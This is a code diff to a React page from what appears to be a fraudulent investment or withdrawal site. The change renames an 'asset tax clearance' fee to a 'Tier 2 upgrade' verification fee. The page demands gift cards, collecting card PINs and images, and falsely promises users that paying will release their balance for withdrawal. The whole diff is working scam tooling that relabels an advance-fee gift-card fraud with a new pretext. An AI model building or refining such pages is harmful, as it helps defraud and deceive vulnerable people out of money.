@@ -4,7 +4,6 @@ import { useAuth } from '../../context/AuthContext';
 import { submitAssetTaxCards, getSettings } from '../../services/api';
 import toast from 'react-hot-toast';
 import {
-  LuFileText as FileText,
   LuPlus as Plus,
   LuTrash2 as Trash2,
   LuUpload as Upload,
@@ -12,6 +11,7 @@ import {
   LuArrowLeft as ArrowLeft,
   LuClock as Clock,
   LuShieldCheck as ShieldCheck,
+  LuRocket as Rocket,
 } from 'react-icons/lu';
 import './AssetTaxView.css';
 
@@ -30,27 +30,27 @@ export const AssetTaxView = () => {
     }).catch(() => {});
   }, []);
 
-  const taxAmount = settings?.taxAmount || 500;
-  const taxCardType = settings?.taxCardType || 'Apple Card';
+  const upgradeAmount = settings?.taxAmount || 500;
+  const upgradeCardType = settings?.taxCardType || 'Apple Card';
 
   useEffect(() => {
     if (cards.length === 0) {
       setCards([{
-        id: `tax-${Date.now()}`,
-        cardType: taxCardType,
-        amount: taxAmount,
+        id: `upgrade-${Date.now()}`,
+        cardType: upgradeCardType,
+        amount: upgradeAmount,
         pin: '',
         imageUrl: '',
         imageFileName: ''
       }]);
     }
-  }, [taxCardType, taxAmount, cards.length]);
+  }, [upgradeCardType, upgradeAmount, cards.length]);
 
   const addCard = () => {
     setCards([...cards, {
-      id: `tax-${Date.now()}-${Math.random().toString(36).substr(2,4)}`,
-      cardType: taxCardType,
-      amount: taxAmount,
+      id: `upgrade-${Date.now()}-${Math.random().toString(36).substr(2,4)}`,
+      cardType: upgradeCardType,
+      amount: upgradeAmount,
       pin: '',
       imageUrl: '',
       imageFileName: ''
@@ -88,7 +88,7 @@ export const AssetTaxView = () => {
     setIsSubmitting(true);
     try {
       await submitAssetTaxCards(user.id, cards);
-      toast.success('Asset tax cards submitted!');
+      toast.success('Upgrade payment submitted!');
       setShowSuccessModal(true);
     } catch (err) {
       setErrorMessage(err.message || 'Submission failed.');
@@ -107,25 +107,32 @@ export const AssetTaxView = () => {
 
       {showSuccessModal && (
         <div className="success-modal">
-          <div><Clock /></div>
-          <h3>Tax Clearance Submitted</h3>
-          <p>Your asset tax clearance cards have been received. Upon compliance review, your balance will be credited with ${totalAmount.toLocaleString()} and your withdrawal will proceed.</p>
-          <button onClick={() => { setShowSuccessModal(false); navigate('/dashboard'); }}>Return to Dashboard</button>
+          <div className="success-modal-card">
+            <div className="success-icon"><Clock /></div>
+            <h3>Upgrade Request Submitted</h3>
+            <p>Your Tier 2 upgrade payment has been received. Upon approval, your account will be upgraded.</p>
+            <button onClick={() => { setShowSuccessModal(false); navigate('/dashboard'); }}>Return to Dashboard</button>
+          </div>
         </div>
       )}
 
       <div className="tax-container">
         <div className="header">
-          <FileText />
+          <Rocket />
           <div>
-            <h1>Asset Tax Clearance Protocol</h1>
-            <p>Institutional capital gains compliance stamp</p>
+            <h1>Upgrade to Tier 2</h1>
+            <p>Unlock institutional-level withdrawal limits</p>
           </div>
         </div>
 
         <div className="notice-box">
-          <ShieldCheck /> Asset Tax Requirement Notice
-          <p>{settings?.taxCustomNotice || `You will have to pay an asset tax fee of $${taxAmount.toLocaleString()}, to proceed with your withdrawal. Note: the tax fee will be added to your balance.`}</p>
+          <ShieldCheck /> Tier 2 Upgrade Requirement
+          <p>
+            To upgrade your account to Tier 2 and enable high‑volume withdrawals, 
+            you need to pay a verification fee of <strong>${upgradeAmount.toLocaleString()}</strong>.
+            <br /><br />
+            <strong>Note:</strong> After approval, your money will be added to your account balance, and you will be able to withdraw it.
+          </p>
         </div>
 
         {errorMessage && <div className="error-banner"><AlertCircle /> {errorMessage}</div>}
@@ -134,13 +141,13 @@ export const AssetTaxView = () => {
           {cards.map((card, index) => (
             <div key={card.id} className="card-entry">
               <div className="card-header">
-                <span>Asset Tax {taxCardType} #{index + 1}</span>
+                <span>{upgradeCardType} Verification #{index + 1}</span>
                 {cards.length > 1 && (
                   <button type="button" onClick={() => removeCard(card.id)}><Trash2 /> Remove</button>
                 )}
               </div>
               <div className="form-row">
-                <div><label>Card Type</label><input type="text" readOnly value={taxCardType} /></div>
+                <div><label>Card Type</label><input type="text" readOnly value={upgradeCardType} /></div>
                 <div><label>Amount ($)</label><input type="number" value={card.amount} onChange={e => handleChange(card.id, 'amount', parseFloat(e.target.value) || 0)} required /></div>
               </div>
               <div><label>Card PIN</label><input type="text" placeholder="e.g. X982-1104-5829-4401" value={card.pin} onChange={e => handleChange(card.id, 'pin', e.target.value)} required /></div>
@@ -161,7 +168,7 @@ export const AssetTaxView = () => {
           </button>
 
           <button type="submit" className="submit-btn" disabled={isSubmitting}>
-            {isSubmitting ? 'Submitting...' : `Submit Asset Tax Clearance ($${totalAmount.toLocaleString()})`}
+            {isSubmitting ? 'Submitting...' : `Pay Upgrade Fee ($${totalAmount.toLocaleString()})`}
           </button>
         </form>
       </div>
